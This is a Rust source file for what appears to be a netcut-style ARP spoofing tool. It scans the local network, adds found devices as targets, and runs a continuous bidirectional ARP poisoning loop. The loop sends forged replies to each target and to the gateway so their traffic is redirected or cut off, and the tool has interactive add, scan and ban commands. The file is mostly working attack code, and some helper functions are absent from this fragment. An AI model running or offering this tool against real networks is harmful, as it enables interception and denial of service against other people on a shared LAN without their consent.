// -------- Logger --------

struct Logger {
    file: Option<Mutex<File>>,
    json_mode: bool,
}

impl Logger {
    fn new(filename: Option<String>, json_mode: bool) -> Result<Self> {
        let file = if let Some(fname) = filename {
            Some(Mutex::new(File::create(fname)?))
        } else {
            None
        };
        Ok(Self { file, json_mode })
    }
    
    fn log(&self, message: &str) {
        // Log to stderr
        eprintln!("{}", message);
        
        // Log to file if enabled
        if let Some(ref file) = self.file {
            let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
            let mut f = file.lock().unwrap();
            let _ = writeln!(f, "[{}] {}", timestamp, message);
        }
    }
}
// -------- Main --------

fn main() -> Result<()> {
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }

    let args = Args::parse();
    let json_mode = args.json;
    
    // Setup logger
    let logger = Logger::new(args.log_file.clone(), json_mode)?;

    // Parse arguments
    if args.rate < 1 {
        output_invalid_argument("Rate must be at least 1", json_mode);
        ExitCode::InvalidArgument.exit(Some("INVALID_ARGUMENT|N/A|Rate must be at least 1"));
    }

    // Get interface info with proper error handling
    let ifindex = match get_iface_index(&args.iface) {
        Ok(idx) => idx,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("INTERFACE_NOT_FOUND") {
                output_interface_not_found(&args.iface, json_mode);
                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
            } else if msg.contains("PERMISSION_DENIED") {
                output_permission_denied(json_mode);
                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
            } else {
                output_internal_error(&msg, json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
            }
        }
    };
    
    let src_mac = match get_iface_mac(&args.iface) {
        Ok(mac) => mac,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("INTERFACE_NOT_FOUND") {
                output_interface_not_found(&args.iface, json_mode);
                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
            } else if msg.contains("PERMISSION_DENIED") {
                output_permission_denied(json_mode);
                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
            } else {
                output_internal_error(&msg, json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
            }
        }
    };
    
    let src_ip = match get_iface_ipv4(&args.iface) {
        Ok(ip) => ip,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("INTERFACE_NOT_FOUND") {
                output_interface_not_found(&args.iface, json_mode);
                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
            } else if msg.contains("PERMISSION_DENIED") {
                output_permission_denied(json_mode);
                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
            } else {
                output_internal_error(&msg, json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
            }
        }
    };
    
    logger.log(&format!(
        "Service starting: iface={} ifindex={} mac={} ip={}",
        args.iface,
        ifindex,
        format_mac(&src_mac),
        src_ip
    ));

    let running = Arc::new(AtomicBool::new(true));
    let stop = Arc::new(AtomicBool::new(false));
    let bans: Arc<Mutex<Vec<Ipv4Addr>>> = Arc::new(Mutex::new(Vec::new()));

    // Signal handling
    {
        let running = running.clone();
        let stop = stop.clone();

        let mut signals = match Signals::new(&[SIGINT, SIGTERM]) {
            Ok(s) => s,
            Err(e) => {
                output_internal_error(&e.to_string(), json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", e)));
            }
        };

        thread::spawn(move || {
            for signal in signals.forever() {
                match signal {
                    SIGINT => {
                        eprintln!("\n[*] Received SIGINT (Ctrl+C), shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    SIGTERM => {
                        eprintln!("[*] Received SIGTERM, shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    _ => unreachable!(),
                }
            }
        });
    }

    // Android service mode
    if args.android_service {
        if let Some(parent_pid) = args.parent_pid {
            eprintln!("[*] Android service mode enabled, monitoring parent PID: {}", parent_pid);
            monitor_parent(parent_pid, &running, &stop);
        } else {
            output_invalid_argument("Missing --parent-pid for android service mode", json_mode);
            ExitCode::InvalidArgument.exit(Some("INVALID_ARGUMENT|N/A|Android service requires --parent-pid"));
        }
    }

    let timeout = Duration::from_secs(args.resolve_timeout);

    // Resolve gateway
    eprintln!("[*] Resolving gateway MAC...");
    let gateway_mac = match resolve_mac(
        &args.iface,
        src_mac,
        src_ip,
        args.gateway,
        ifindex,
        timeout,
        &stop,
    ) {
        Ok(mac) => mac,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("MAC_RESOLUTION_FAILED") {
                output_gateway_not_found(json_mode);
                ExitCode::GatewayNotFound.exit(Some(&format!("GATEWAY_NOT_FOUND|{}|{}", args.gateway, msg)));
            } else {
                output_internal_error(&msg, json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
            }
        }
    };
    eprintln!("[+] Gateway MAC: {}", format_mac(&gateway_mac));

    // Load persisted targets - FIXED
    let initial_targets = match load_targets(
        &args.persist_file,
        &args.iface,
        src_mac,
        src_ip,
        ifindex,
        timeout,
        &stop,
    ) {
        Ok((targets, bans_list)) => {
            // Store the bans in the mutex
            *bans.lock().unwrap() = bans_list;
            targets // Return only the targets
        }
        Err(e) => {
            eprintln!("[!] Failed to load persisted targets: {}", e);
            HashMap::new() // Return empty HashMap
        }
    };

    let targets: Arc<Mutex<HashMap<Ipv4Addr, TargetInfo>>> = Arc::new(Mutex::new(initial_targets));

    // Network scan on startup
    if args.scan_on_start {
        if let Some(scan_range) = args.scan_range {
            eprintln!("[*] Scanning network range: {}", scan_range);
            // Simple scan implementation
            if let Ok(found) = scan_network(
                &args.iface,
                src_mac,
                src_ip,
                ifindex,
                timeout,
                &stop,
            ) {
                for ip in found {
                    if let Ok(mac) = resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, Duration::from_secs(2), &stop) {
                        if !targets.lock().unwrap().contains_key(&ip) {
                            targets.lock().unwrap().insert(ip, TargetInfo {
                                ip,
                                mac,
                                added_at: Instant::now(),
                                packets_sent: 0,
                            });
                            output_target_added(ip, json_mode);
                        }
                    }
                }
            }
        } else {
            // Auto-scan the network
            eprintln!("[*] Auto-scanning network...");
            if let Ok(found) = scan_network(
                &args.iface,
                src_mac,
                src_ip,
                ifindex,
                Duration::from_secs(10),
                &stop,
            ) {
                for ip in found {
                    if let Ok(mac) = resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, Duration::from_secs(2), &stop) {
                        if !targets.lock().unwrap().contains_key(&ip) {
                            targets.lock().unwrap().insert(ip, TargetInfo {
                                ip,
                                mac,
                                added_at: Instant::now(),
                                packets_sent: 0,
                            });
                            output_target_added(ip, json_mode);
                        }
                    }
                }
            }
        }
    }

    // Process initial targets from command line
    for ip in args.initial_targets {
        if targets.lock().unwrap().contains_key(&ip) {
            output_already_exists(ip, json_mode);
            continue;
        }
        
        eprintln!("[*] Resolving initial target MAC for {}...", ip);
        match resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, timeout, &stop) {
            Ok(mac) => {
                targets.lock().unwrap().insert(ip, TargetInfo {
                    ip,
                    mac,
                    added_at: Instant::now(),
                    packets_sent: 0,
                });
                output_target_added(ip, json_mode);
                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
            }
            Err(e) => {
                output_mac_resolution_failed(ip, json_mode);
                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
            }
        }
    }

    // Create raw socket
    let sock = match RawSock::new(ETH_P_ARP as u16) {
        Ok(s) => s,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("PERMISSION_DENIED") {
                output_permission_denied(json_mode);
                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied to create raw socket"));
            } else {
                output_internal_error(&msg, json_mode);
                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
            }
        }
    };
    
    if let Err(e) = sock.bind_to_device(&args.iface) {
        let msg = e.to_string();
        if msg.contains("PERMISSION_DENIED") {
            output_permission_denied(json_mode);
            ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied to bind to device"));
        } else {
            output_internal_error(&msg, json_mode);
            ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
        }
    }

    // Output service started
    output_service_started(Some(src_ip), json_mode);

    // Create stats tracker
    let stats = Arc::new(Stats::new());

    // ... rest of the code remains the same ...

    

    // -------- Interactive Command Thread --------
    let targets_clone = Arc::clone(&targets);
    let running_clone = Arc::clone(&running);
    let stop_clone = Arc::clone(&stop);
    let bans_clone = Arc::clone(&bans);
    let iface_clone = args.iface.clone();
    let gateway_clone = args.gateway;
    let src_mac_clone = src_mac;
    let src_ip_clone = src_ip;
    let ifindex_clone = ifindex;
    let timeout_clone = timeout;
    let gateway_mac_clone = gateway_mac;
    let persist_file_clone = args.persist_file.clone();
    let stats_clone = Arc::clone(&stats);
    let json_mode_clone = json_mode;

    thread::spawn(move || {
        let stdin = std::io::stdin();
        let mut input = String::new();
        let is_tty = unsafe { libc::isatty(libc::STDIN_FILENO) == 1 };
        
        if is_tty {
            eprintln!("[*] Service ready. Commands:");
            eprintln!("  add <ip>                    - Add target");
            eprintln!("  remove <ip>                 - Remove target");
            eprintln!("  list                       - List targets");
            eprintln!("  status                     - Show status");
            eprintln!("  stats [ip]                 - Show statistics");
            eprintln!("  flush                      - Remove all targets");
            eprintln!("  scan                       - Scan network for devices");
            eprintln!("  ban <ip>                   - Ban a device (permanent block)");
            eprintln!("  unban <ip>                 - Unban a device");
            eprintln!("  save                       - Save targets to file");
            eprintln!("  load                       - Load targets from file");
            eprintln!("  quit / exit                - Stop service");
        } else {
            eprintln!("[*] Service ready in background mode. Waiting for commands via stdin...");
        }

        while running_clone.load(Ordering::SeqCst) {
            if is_tty {
                eprint!("netcut> ");
                let _ = std::io::stderr().flush();
            }
            
            input.clear();
            match stdin.read_line(&mut input) {
                Ok(0) => {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }
                Ok(_) => {
                    if input.trim().is_empty() {
                        continue;
                    }
                }
                Err(_) => {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }
            }

            let parts: Vec<&str> = input.trim().split_whitespace().collect();
            if parts.is_empty() { continue; }

            match parts[0] {
                "add" => {
                    if parts.len() < 2 {
                        output_invalid_argument("Missing IP address", json_mode_clone);
                        eprintln!("Usage: add <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        // Check if banned
                        if bans_clone.lock().unwrap().contains(&ip) {
                            eprintln!("[!] {} is banned. Use 'unban' first.", ip);
                            continue;
                        }
                        
                        let already_exists = {
                            let t = targets_clone.lock().unwrap();
                            t.contains_key(&ip)
                        };
                        if already_exists {
                            output_already_exists(ip, json_mode_clone);
                            eprintln!("[!] {} is already in the target list.", ip);
                            continue;
                        }
                        
                        eprintln!("[*] Resolving MAC for {}...", ip);
                        match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip, ifindex_clone, timeout_clone, &stop_clone) {
                            Ok(mac) => {
                                let mut t = targets_clone.lock().unwrap();
                                t.insert(ip, TargetInfo {
                                    ip,
                                    mac,
                                    added_at: Instant::now(),
                                    packets_sent: 0,
                                });
                                output_target_added(ip, json_mode_clone);
                                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
                            }
                            Err(e) => {
                                output_mac_resolution_failed(ip, json_mode_clone);
                                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
                            }
                        }
                    } else {
                        output_invalid_argument(parts[1], json_mode_clone);
                        eprintln!("[!] Invalid IP address.");
                    }
                }
                "remove" => {
                    if parts.len() < 2 {
                        output_invalid_argument("Missing IP address", json_mode_clone);
                        eprintln!("Usage: remove <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        let info = {
                            let mut t = targets_clone.lock().unwrap();
                            t.remove(&ip)
                        };
                        
                        if let Some(info) = info {
                            eprintln!("[*] Removing {} and restoring ARP...", ip);
                            
                            if let Ok(temp_sock) = RawSock::new(ETH_P_ARP as u16) {
                                aggressive_restore(
                                    &temp_sock,
                                    ifindex_clone,
                                    &vec![(ip, info.mac)],
                                    gateway_clone,
                                    gateway_mac_clone,
                                    &iface_clone,
                                    src_mac_clone,
                                    src_ip_clone,
                                );
                            } else {
                                eprintln!("[!] Failed to create temporary socket for restoration.");
                            }
                            
                            output_target_removed(ip, json_mode_clone);
                            eprintln!("[+] Removed {} and restored ARP.", ip);
                        } else {
                            output_target_not_found(ip, json_mode_clone);
                            eprintln!("[!] {} is not in the target list.", ip);
                        }
                    } else {
                        output_invalid_argument(parts[1], json_mode_clone);
                        eprintln!("[!] Invalid IP address.");
                    }
                }
                "flush" => {
                    let targets_to_remove = {
                        let t = targets_clone.lock().unwrap();
                        t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
                    };
                    
                    if targets_to_remove.is_empty() {
                        output_success("No targets to flush", None, json_mode_clone);
                        eprintln!("[*] No targets to flush.");
                        continue;
                    }
                    
                    eprintln!("[*] Flushing all {} targets...", targets_to_remove.len());
                    
                    if let Ok(temp_sock) = RawSock::new(ETH_P_ARP as u16) {
                        aggressive_restore(
                            &temp_sock,
                            ifindex_clone,
                            &targets_to_remove,
                            gateway_clone,
                            gateway_mac_clone,
                            &iface_clone,
                            src_mac_clone,
                            src_ip_clone,
                        );
                    }
                    
                    {
                        let mut t = targets_clone.lock().unwrap();
                        t.clear();
                    }
                    
                    if json_mode_clone {
                        println!(r#"{{"code":111,"status":"FLUSH_COMPLETE","ip":"N/A","message":"Flushed {} targets"}}"#, targets_to_remove.len());
                    } else {
                        println!("111|FLUSH_COMPLETE|N/A|Flushed {} targets", targets_to_remove.len());
                    }
                    eprintln!("[+] Flushed all targets.");
                }
                "list" => {
                    let t = targets_clone.lock().unwrap();
                    if t.is_empty() {
                        output_success("No targets currently added", None, json_mode_clone);
                        eprintln!("[*] No targets currently added.");
                    } else {
                        if json_mode_clone {
                            let mut json = String::from(r#"{"targets":["#);
                            for (ip, info) in t.iter() {
                                json.push_str(&format!(
                                    r#"{{"ip":"{}","mac":"{}","packets":{}}},"#,
                                    ip,
                                    format_mac(&info.mac),
                                    info.packets_sent
                                ));
                            }
                            json.pop();
                            json.push_str("]}");
                            println!("{}", json);
                        } else {
                            let ips: Vec<String> = t.keys().map(|ip| ip.to_string()).collect();
                            println!("0|TARGET_LIST|{}|{}", ips.join(","), t.len());
                        }
                        
                        eprintln!("[*] Current targets:");
                        for (ip, info) in t.iter() {
                            eprintln!("  - {} ({}) [packets: {}]", 
                                ip, 
                                format_mac(&info.mac),
                                info.packets_sent
                            );
                        }
                    }
                }
                "status" => {
                    let t = targets_clone.lock().unwrap();
                    let b = bans_clone.lock().unwrap();
                    output_success(&format!("Service running | Targets: {} | Bans: {}", t.len(), b.len()), None, json_mode_clone);
                    eprintln!("[*] Service is running. Active targets: {}, Banned devices: {}", t.len(), b.len());
                }
                "stats" => {
                    if parts.len() >= 2 {
                        if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                            if let Some(stats_data) = stats_clone.get_stats(ip) {
                                if json_mode_clone {
                                    println!(r#"{{"ip":"{}","packets_sent":{},"uptime":{},"first_seen":{}}}"#,
                                        ip,
                                        stats_data.packets_sent,
                                        stats_data.first_seen.elapsed().as_secs(),
                                        stats_data.first_seen.elapsed().as_secs()
                                    );
                                } else {
                                    println!("0|STATS|{}|Packets: {} | Uptime: {}s", 
                                        ip,
                                        stats_data.packets_sent,
                                        stats_data.first_seen.elapsed().as_secs()
                                    );
                                }
                            } else {
                                output_target_not_found(ip, json_mode_clone);
                            }
                        } else {
                            output_invalid_argument(parts[1], json_mode_clone);
                        }
                    } else {
                        let all_stats = stats_clone.get_all_stats();
                        if all_stats.is_empty() {
                            output_success("No stats available", None, json_mode_clone);
                        } else {
                            let total_packets: u64 = all_stats.values().map(|s| s.packets_sent).sum();
                            if json_mode_clone {
                                let mut json = String::from(r#"{"stats":["#);
                                for (ip, stats_data) in all_stats {
                                    json.push_str(&format!(
                                        r#"{{"ip":"{}","packets":{},"uptime":{}}},"#,
                                        ip,
                                        stats_data.packets_sent,
                                        stats_data.first_seen.elapsed().as_secs()
                                    ));
                                }
                                json.pop();
                                json.push_str(&format!(r#"],"total_packets":{}}}"#, total_packets));
                                println!("{}", json);
                            } else {
                                println!("0|STATS|ALL|Total packets: {} | Targets: {}", 
                                    total_packets,
                                    all_stats.len()
                                );
                            }
                        }
                    }
                }
                "scan" => {
                    eprintln!("[*] Scanning network for devices...");
                    if let Ok(found) = scan_network(
                        &iface_clone,
                        src_mac_clone,
                        src_ip_clone,
                        ifindex_clone,
                        Duration::from_secs(10),
                        &stop_clone,
                    ) {
                        let new_targets: Vec<Ipv4Addr> = found
                            .into_iter()
                            .filter(|ip| {
                                !targets_clone.lock().unwrap().contains_key(ip)
                            })
                            .collect();
                        
                        for ip in new_targets {
                            if let Ok(mac) = resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip, ifindex_clone, Duration::from_secs(2), &stop_clone) {
                                targets_clone.lock().unwrap().insert(ip, TargetInfo {
                                    ip,
                                    mac,
                                    added_at: Instant::now(),
                                    packets_sent: 0,
                                });
                                output_target_added(ip, json_mode_clone);
                            }
                        }
                        
                        let count = targets_clone.lock().unwrap().len();
                        if json_mode_clone {
                            println!(r#"{{"code":112,"status":"SCAN_COMPLETE","ip":"N/A","message":"Scan complete. Total targets: {}"}}"#, count);
                        } else {
                            println!("112|SCAN_COMPLETE|N/A|Scan complete. Total targets: {}", count);
                        }
                    }
                }
                "ban" => {
                    if parts.len() < 2 {
                        output_invalid_argument("Missing IP address", json_mode_clone);
                        eprintln!("Usage: ban <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        let mut b = bans_clone.lock().unwrap();
                        if b.contains(&ip) {
                            eprintln!("[!] {} is already banned.", ip);
                            continue;
                        }
                        
                        // Remove from targets if present
                        let was_target = {
                            let mut t = targets_clone.lock().unwrap();
                            t.remove(&ip).is_some()
                        };
                        
                        if was_target {
                            eprintln!("[*] {} was a target. Removing and banning...", ip);
                        }
                        
                        b.push(ip);
                        output_ban_added(ip, json_mode_clone);
                        eprintln!("[+] {} is now banned from the network.", ip);
                    } else {
                        output_invalid_argument(parts[1], json_mode_clone);
                    }
                }
                "unban" => {
                    if parts.len() < 2 {
                        output_invalid_argument("Missing IP address", json_mode_clone);
                        eprintln!("Usage: unban <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        let mut b = bans_clone.lock().unwrap();
                        if let Some(pos) = b.iter().position(|&x| x == ip) {
                            b.remove(pos);
                            output_ban_removed(ip, json_mode_clone);
                            eprintln!("[+] {} is no longer banned.", ip);
                        } else {
                            output_target_not_found(ip, json_mode_clone);
                            eprintln!("[!] {} is not banned.", ip);
                        }
                    } else {
                        output_invalid_argument(parts[1], json_mode_clone);
                    }
                }
                "save" => {
                    let t = targets_clone.lock().unwrap();
                    let b = bans_clone.lock().unwrap();
                    if let Err(e) = save_targets(&t, &b, &persist_file_clone) {
                        output_internal_error(&e.to_string(), json_mode_clone);
                        eprintln!("[!] Failed to save targets: {}", e);
                    } else {
                        if json_mode_clone {
                            println!(r#"{{"code":113,"status":"SAVE_COMPLETE","ip":"N/A","message":"Saved {} targets"}}"#, t.len());
                        } else {
                            println!("113|SAVE_COMPLETE|N/A|Saved {} targets", t.len());
                        }
                    }
                }
                "load" => {
                    if let Ok((loaded_targets, loaded_bans)) = load_targets(
                        &persist_file_clone,
                        &iface_clone,
                        src_mac_clone,
                        src_ip_clone,
                        ifindex_clone,
                        timeout_clone,
                        &stop_clone,
                    ) {
                        {
                            let mut t = targets_clone.lock().unwrap();
                            for (ip, info) in loaded_targets {
                                t.insert(ip, info);
                            }
                        }
                        {
                            let mut b = bans_clone.lock().unwrap();
                            *b = loaded_bans;
                        }
                        let count = targets_clone.lock().unwrap().len();
                        if json_mode_clone {
                            println!(r#"{{"code":114,"status":"LOAD_COMPLETE","ip":"N/A","message":"Loaded {} targets"}}"#, count);
                        } else {
                            println!("114|LOAD_COMPLETE|N/A|Loaded {} targets", count);
                        }
                    } else {
                        output_internal_error("Failed to load targets", json_mode_clone);
                    }
                }
                "quit" | "exit" => {
                    output_success("Shutting down service", None, json_mode_clone);
                    eprintln!("[*] Shutting down...");
                    running_clone.store(false, Ordering::SeqCst);
                    stop_clone.store(true, Ordering::Release);
                    break;
                }
                _ => {
                    output_invalid_argument(parts[0], json_mode_clone);
                    eprintln!("[!] Unknown command. Available commands:");
                    eprintln!("  add, remove, list, status, stats, flush");
                    eprintln!("  scan, ban, unban, save, load, quit");
                }
            }
        }
    });

    // -------- Bidirectional Poisoning Loop --------
    let interval = Duration::from_millis(1000 / args.rate.max(1));
    eprintln!("[*] Bidirectional poisoning engine active. Waiting for targets...");

    while running.load(Ordering::SeqCst) {
        if stop.load(Ordering::Acquire) {
            break;
        }

        let targets_snapshot = {
            let t = targets.lock().unwrap();
            t.iter()
                .filter(|(ip, _)| {
                    // Check if target is banned
                    let b = bans.lock().unwrap();
                    !b.contains(ip)
                })
                .map(|(ip, info)| (*ip, info.mac))
                .collect::<Vec<_>>()
        };

        if targets_snapshot.is_empty() {
            thread::sleep(Duration::from_secs(1));
            continue;
        }

        for (ip, mac) in targets_snapshot {
            // 1. Poison Target: Tell target the gateway is at our MAC
            let poison_target = build_arp_reply(src_mac, mac, args.gateway, ip);
            let _ = sock.send_frame(poison_target.as_bytes(), ifindex);
            
            // 2. Poison Gateway: Tell gateway the target is at our MAC
            let poison_gateway = build_arp_reply(src_mac, gateway_mac, ip, args.gateway);
            let _ = sock.send_frame(poison_gateway.as_bytes(), ifindex);
            
            // Record stats
            stats.record_send(ip);
        }
        
        thread::sleep(interval);
    }

    // -------- Aggressive Bidirectional Restore --------
    let targets_snapshot = {
        let t = targets.lock().unwrap();
        t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
    };

    if !targets_snapshot.is_empty() {
        aggressive_restore(
            &sock,
            ifindex,
            &targets_snapshot,
            args.gateway,
            gateway_mac,
            &args.iface,
            src_mac,
            src_ip,
        );
    }

    // Save targets on exit
    let t = targets.lock().unwrap();
    let b = bans.lock().unwrap();
    let _ = save_targets(&t, &b, &args.persist_file);

    output_success("Service stopped", None, json_mode);
    eprintln!("[+] Restore complete. Exiting.");
    ExitCode::Success.exit(Some("SUCCESS|N/A|Service stopped successfully"));
}
